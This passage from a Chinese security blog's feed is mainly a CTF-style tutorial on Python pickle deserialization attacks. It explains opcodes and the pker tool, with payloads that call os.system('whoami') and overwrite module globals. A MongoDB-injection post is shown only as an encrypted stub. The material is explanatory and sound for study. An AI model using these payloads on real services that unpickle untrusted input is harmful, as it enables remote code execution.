  <entry>
    <title>MongDB注入指北</title>
    <link href="/tuyi/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MangDB注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化</title>
    <link href="/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是pickle"><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h1><ul><li><p>pickle实际上是一门栈语言</p></li><li><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包</p></li><li><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</p></li><li><p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p></li></ul><h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><ul><li><code>None</code> 、 <code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li>str、byte、bytearray</li><li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li><li>定义在模块最外层的内置函数</li><li>定义在模块最外层的类</li><li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li></ul><h2 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__() 函数"></a><code>object.__reduce__()</code> 函数</h2><ul><li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li><li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li></ul><h1 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h1><ul><li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li><li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li><li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li><li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li><li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li><li>PVM解析 <code>str</code> 的过程动图：</li></ul><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230631-6204866e-6abc-1.gif" alt="img"></p><ul><li><p>PVM解析 <code>__reduce__()</code> 的过程动图：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>pickle EXP的简单demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><br><span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span><br></code></pre></td></tr></table></figure><p>变量覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2) <span class="hljs-comment">#覆盖</span><br></code></pre></td></tr></table></figure><h1 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h1><ul><li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li><li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li><li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode</li></ul><h2 id="常用opcode解析"><a href="#常用opcode解析" class="headerlink" title="常用opcode解析"></a>常用opcode解析</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p><p>常用的opcode如下：完整的可在<code>$PYTHON/Lib/pickle.py</code>查看</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。</p><p>用这些opcode我们可以得到一些需要注意的地方：</p><ul><li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li><li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li><li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li><li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li><li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li></ul><h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p><h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><p>python源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># secret.py</span><br>name=<span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret.name)<br><br>output=pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,secret.name)<br></code></pre></td></tr></table></figure><p>这段字节码的含义是：</p><ol><li><code>c__main__\nsecret\n</code>：<ul><li>从 <code>__main__</code> 模块中获取 <code>secret</code> 对象。</li></ul></li><li><code>(S&#39;name&#39;\nS&#39;1&#39;\ndb.</code>：<ul><li>创建一个字典 <code>&#123;&#39;name&#39;: &#39;1&#39;&#125;</code>，并将其赋值给 <code>secret</code> 对象的 <code>__dict__</code> 属性。</li></ul></li></ol><p>使用到的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4><p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p><ol><li><code>R</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cos：</span><br><span class="hljs-string">从 os 模块中获取 system 函数。</span><br><span class="hljs-string">system：</span><br><span class="hljs-string">调用 os.system 函数。</span><br><span class="hljs-string">(S&#x27;whoami&#x27;：</span><br><span class="hljs-string">将字符串 &#x27;whoami&#x27; 作为参数传递给 os.system。</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>i</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>(S<span class="hljs-string">&#x27;whoami&#x27;</span>\nios\nsystem\n.：<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>：表明这是一个字符串，值为 <span class="hljs-string">&#x27;whoami&#x27;</span>。<br>ios 和 system：指向 Python 模块 os 的 system 方法。<br>.：表示序列化结束<br></code></pre></td></tr></table></figure><ol start="3"><li><code>o</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br>(cos\nsystem\nS<span class="hljs-string">&#x27;whoami&#x27;</span>\no.：<br>c：表示引用一个模块。<br>os：表示导入的模块是 Python 的标准库 os。<br>system：引用了 os 模块中的 system 方法。<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>：序列化的字符串，内容为 <span class="hljs-string">&#x27;whoami&#x27;</span>。<br>o：表示调用（对象应用），将字符串作为参数传递给 os.system 方法。<br>.：表示序列化结束。<br></code></pre></td></tr></table></figure><h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br><span class="hljs-comment">#创建了student对象</span><br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li><li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li><li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><h2 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h2><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p><h2 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">以下<span class="hljs-keyword">module</span>都可以是包含`.`的子<span class="hljs-keyword">module</span><br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br><span class="hljs-keyword">GLOBAL</span><br>对应opcode：b<span class="hljs-string">&#x27;c&#x27;</span><br>获取<span class="hljs-keyword">module</span>下的一个全局对象（没有import的也可以，比如下面的os）：<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：<span class="hljs-keyword">module</span>,instance(callable、<span class="hljs-keyword">module</span>都是instance)  <br><br>INST<br>对应opcode：b<span class="hljs-string">&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>对应opcode：b<span class="hljs-string">&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：callable,para<br><br>xxx(xx,...)<br>对应opcode：b<span class="hljs-string">&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：b<span class="hljs-string">&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>对应opcode：b<span class="hljs-string">&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：b<span class="hljs-string">&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>被解析为：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span 